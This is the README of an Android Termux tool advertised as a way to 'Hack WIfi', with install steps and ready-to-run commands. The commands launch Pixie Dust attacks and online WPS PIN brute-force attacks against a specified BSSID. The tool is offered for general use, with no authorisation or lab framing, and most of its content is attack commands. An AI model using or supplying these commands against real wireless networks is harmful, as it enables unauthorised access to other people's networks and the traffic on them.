<h1 align="center">WIFI-Tool</h1>
<h4 align="center">Hack WIfi Using Termux! (Requires Root)</h4>

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python wpa-supplicant pixiewps iw -y
git clone https://github.com/PPM-47/WIFI-Tool 
cd WIFI-Tool 
pip3 install -r requirements.txt
chmod +x WIFI-Tool.py
```
#### Help : `sudo python WIFI-tool.py --help`
#### Example : `sudo python WIFI-tool.py -i wlan0 -K`

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python WIFI-tool.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python WIFI-tool.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python WIFI-tool.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**

### License

````
MIT License

Copyright (c) 2023

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```` 

+ **IF FAILED TURN OFF LOCATION IF TURNED ON.**

Repo : <a href="https://github.com/PPM-47/WIFI-Tool"> Here </a>
